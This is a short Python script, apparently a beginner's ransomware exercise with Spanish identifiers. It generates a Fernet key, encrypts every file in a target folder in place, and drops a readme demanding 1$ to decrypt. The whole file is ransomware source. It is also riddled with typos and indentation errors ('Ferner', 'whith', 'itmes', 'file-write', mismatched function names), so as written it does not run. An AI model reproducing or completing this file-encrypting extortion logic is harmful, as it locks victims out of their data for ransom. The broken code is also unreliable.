from cryptography.fernet import Fernet
import os

def generar_key():
    key= Ferner.generar_key()
    whith open('key.key', 'wb') as key_free:
        key_file.write(key)


def cargarkey():
    return open('key.key', 'rb').read()


def encrypt(items, key):
    f = Fernet(key)
    for items in itmes:
        whith open(item, 'rb') as file:
        file_data = file.read()
    encrypted_data =f.encrypt(file_data)
    with open(item, 'wb') as file:
        file.write(encrypted_data)



if __name__ == '__main__':

    path_to_encrypt = 'C:\Users\avaro\OneDrive\Escritorio\ransom\Files'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]

    generar_key()
    key = cargar_key()

    encrypt(full_path, key)

    with open(path_to_encrypt+'\\'+'readme.txt',  'w') as file:
        file-write('TODOS TUS FICHEROS HAN SIDO ENCRIPTADOS\n')
        file.write('INRESA 1$ PARA DESENCREIPTAR TODOS TUS ARCHIVOS')

        file.write('-----')

    



  